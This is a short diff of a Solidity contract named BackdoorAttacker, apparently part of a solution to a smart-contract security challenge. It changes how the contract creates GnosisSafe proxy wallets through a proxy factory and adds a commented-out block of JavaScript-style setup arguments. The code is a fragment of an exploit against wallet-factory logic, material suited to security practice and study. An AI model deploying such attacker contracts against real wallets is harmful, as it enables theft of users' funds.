@@ -33,21 +33,30 @@ contract BackdoorAttacker is Ownable {
         uint256 salt
     ) private {
         address proxy = address(
-            proxyFactory.createProxyWithCallback(
+            /*
+                    [users[i]],
+        1,
+        fakeMaster.address,
+        ethers.utils.arrayify(data),
+        ethers.constants.AddressZero,
+        ethers.constants.AddressZero,
+        0,
+        ethers.constants.AddressZero,*/
+
+            proxyFactory.createProxyWithNonce(
                 address(masterCopy),
                 abi.encodeWithSelector(
                     GnosisSafe.setup.selector,
-                    [user, msg.sender],
+                    [address(msg.sender)],
                     1,
                     address(0),
-                    bytes("0x"),
+                    bytes(""),
                     address(0),
                     address(0),
                     0,
                     address(0)
                 ),
-                salt,
-                callback
+                salt
             )
         );
 
